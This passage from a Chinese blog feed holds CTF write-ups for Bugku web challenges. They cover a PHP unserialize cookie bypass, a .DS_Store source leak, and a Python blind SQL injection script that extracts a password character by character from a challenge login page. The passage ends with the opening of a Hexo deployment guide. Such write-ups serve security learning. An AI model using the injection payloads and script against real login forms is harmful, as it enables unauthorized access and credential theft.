id="Python编写exp-5"><a href="#Python编写exp-5" class="headerlink" title="Python编写exp"></a>Python编写exp</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2020/11/16 23:27</span><span class="token comment" spellcheck="true"># @Author  : Shadow</span><span class="token comment" spellcheck="true"># @Site    :</span><span class="token comment" spellcheck="true"># @File    : Bugku_PHP_encrypt_1(ISCCCTF).py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">detrcy</span><span class="token punctuation">(</span>b64<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义一个接收数据的空列表</span>    int_b64 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># base64解密b64并赋值给b64de</span>    b64de <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>b64<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 循环b64de次</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>b64de<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 把b64de的old值传入int_b64</span>        int_b64<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>b64de<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print int_b64</span>    <span class="token comment" spellcheck="true"># 对应php代码中的 key= MD5('ISCC')</span>    key <span class="token operator">=</span> <span class="token string">'729623334f0aa2784a1599fd374c120d729623'</span>    <span class="token comment" spellcheck="true"># 定义空列表接收数据</span>    int_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 遍历key的长度次</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 把key的ord值传入int_ky</span>        int_key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print int_key</span>    <span class="token comment" spellcheck="true"># 定义空字符flag接收数据</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token comment" spellcheck="true"># 遍历int_b64的长度</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>int_b64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># flag等于flag加ASCII解码后的int_b64[i]-int_key[i]加128的值除128</span>        <span class="token comment" spellcheck="true"># 涉及到同余加解密</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span>int_b64<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>int_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> flag<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># str_b64 = eccrypt('XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')</span>    <span class="token comment" spellcheck="true"># print 'str_b64-->', str_b64</span>    str_b64 <span class="token operator">=</span> <span class="token string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>    <span class="token comment" spellcheck="true"># print 'str_b64-->', str_b64</span>    detrcy<span class="token punctuation">(</span>str_b64<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>flag：Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</strong></p><h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><p>这题太迷惑人了，一开始我以为是从登录框下手，结果发现不是，而是要GET传值获取源码，进行一个代码审计：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/flagphp/?hint=2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116161251767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="代码审计-8"><a href="#代码审计-8" class="headerlink" title="代码审计"></a>代码审计</h5><p>先来分析下代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 关闭报错</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 包含一次flag.php文件</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 变量cookie等于ISecer</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ISecer'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment"># var_dump($cookie);</span><span class="token shell-comment comment"># 判断是否GET到hint</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hint'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 高亮显示文件内容</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 反序列化key的值，如果全等于反序列化后cookie的值，就输出flag</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"$KEY"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"$flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token delimiter">?></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Login<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>admin.css<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>    <span class="token delimiter">&lt;?php</span><span class="token punctuation">}</span><span class="token variable">$KEY</span><span class="token operator">=</span><span class="token string">'ISecer:www.isecer.com'</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 解题思路</span><span class="token keyword">echo</span> <span class="token string">': $cookie'</span><span class="token punctuation">.</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$KEY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">': $cookie'</span><span class="token punctuation">.</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键在于：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"$KEY"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"$flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>刚开始我以为只要吧key的值序列化一下，作为cookie传过去就行了，但是后来发现不是那么回事这里cookie的值是空的：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$KEY</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">': $cookie'</span><span class="token punctuation">.</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116163720428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116163917146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>意思是反序列化后的cookie全等于key的值，一定不要被底部定义的key欺骗了，它是后定义的，在上面的判断中，key并没有被定义，也就是key为空，也就是说我们传一个空的cookie就符合条件了：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116163943747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：flag{unserialize_by_virink}</strong></p><h3 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h3><h5 id="DS-Store源码泄露"><a href="#DS-Store源码泄露" class="headerlink" title="DS_Store源码泄露"></a>DS_Store源码泄露</h5><p>exp：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">下载地址</a></p><p><strong>方法一：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116171658852.png#pic_center" alt="在这里插入图片描述">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116172128945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>方法二：</strong></p><pre class="line-numbers language-php"><code class="language-php">此块代码为引用！！！！！！成功闭合了单引号下面我们就尝试构造跟下面类似的语句<span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>select <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span>passwd<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">%</span>d把这个语句放在<span class="token number">0</span>和<span class="token number">1</span>的位置就可以取出数据但是这里逗号和空格都不能用，那么substr就用不了，但是我们可以使用<span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，比如passwd<span class="token operator">=</span>abc123那我们可以用以下方式来取出想要的数据<span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span><span class="token number">23</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span><span class="token number">123</span>倒叙输出几位，但是这样如果要截取最后一位的话，显然每次截取的都是<span class="token number">3</span>，因此我们反转过来，使得每次截取出来的不一样先倒叙取出几位<span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token operator">%</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>反转<span class="token function">reverse</span><span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token operator">%</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>取最后一位<span class="token function">mid</span><span class="token punctuation">(</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token operator">%</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>比较ascii值<span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token operator">%</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span> <span class="token operator">%</span>d测试一下发现当表达式为真时，返回的是username error<span class="token operator">!</span><span class="token operator">!</span>当表达式为假时，返回的是password error<span class="token operator">!</span><span class="token operator">!</span>因此我们就可以利用这个特点进行盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Python编写exp-6"><a href="#Python编写exp-6" class="headerlink" title="Python编写exp"></a>Python编写exp</h5><p>这里上一个前辈写的exp，难点就在构造注入语句上啊，确实厉害：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment">#!/usr/bin/env python</span><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span><span class="token shell-comment comment"># @Time    : 2020/11/16 17:29</span><span class="token shell-comment comment"># @Author  : Shadow</span><span class="token shell-comment comment"># @Site    : </span><span class="token shell-comment comment"># @File    : Bugku_sql注入2.py</span><span class="token shell-comment comment"># @Software: PyCharm</span>import requestsurl <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8007/web2/login.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> p in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sqlstr <span class="token operator">=</span> u<span class="token string">"admin'-(ascii(mid(REVERSE(MID((passwd)from(-%d)))from(-1)))=%d)-'"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> p<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'uname'</span><span class="token punctuation">:</span> sqlstr<span class="token punctuation">,</span>            <span class="token string">'passwd'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span>        <span class="token punctuation">}</span>        html <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'username'</span> in html<span class="token punctuation">:</span>            <span class="token keyword">print</span> i            flag <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>            <span class="token keyword">print</span> flag<span class="token keyword">print</span> <span class="token string">"=================================>"</span><span class="token keyword">print</span> <span class="token string">"\n"</span> <span class="token operator">+</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解码flag竟然是：<strong>admin123</strong></p><p>登录后台拿到flag：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116174014181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>flag： flag{sql_iNJEct_comMon3600!}</strong> </p><h3 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h3><p>这题不用看了，phpmyadmin没了，那就是突破点</p><h3 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h3><h5 id="目录扫描-3"><a href="#目录扫描-3" class="headerlink" title="目录扫描"></a>目录扫描</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116182457297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功拿到flag：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116182546985.png#pic_center" alt="在这里插入图片描述"><br><strong>flag：flag1:{0/m9o9PDtcSyu7Tt}</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
            <tag> EXP </tag>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云服务器部署Hexo博客</title>
      <link href="/posts/19d2a4e6.html"/>
      <url>/posts/19d2a4e6.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>  相信大部分人使用Hexo搭建个人博客都会部署到一些免费的代码托管平台上，但这些免费的平台总是差强人意，比如国外的GitHub平台虽然完全免费，但在国内访问加载速度非常慢，又或者是国内的码云平台免费版有许多功能被阉割掉了，比如不能自定义域名，不能每次自动刷新提交的代码，需要到码云平台上手动刷新，如此一来非常繁琐。</p><p>  为了有效解决上诉的一些问题，有条件的话，不妨在自己的云服务器上搭建Hexo博客。</p><h2 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h2><hr><p>这是Hexo博客部署到GitHub上的网站测速效果</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s1.ax1x.com/2020/03/12/8mhkv9.png" alt="演示demo1"></p><p>这是Hexo博客部署到阿里云服务器后的网站测速效果</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s1.ax1x.com/2020/03/12/8mWYQA.png" alt="演示demo2"></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><hr><ul><li>本地环境：Windows 10 </li><li>云服务器环境：阿里云ECS（CentOS7.x）</li></ul><h2 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h2><hr><h3 id="本地环境搭建"><a href="#本地环境搭建" class="headerlink" title="本地环境搭建"></a>本地环境搭建</h3><p><strong>1.安装Git</strong></p><p>到git官网上下载.exe文件,Download git,安装选项还是全部默认，最后一步添加路径时选择<code>Use Git from the Windows Command Prompt</code>。</p><ul><li>Git<a href="https://git-scm.com/download" target="_blank" rel="noopener">下载地址</a></li><li>Git<a 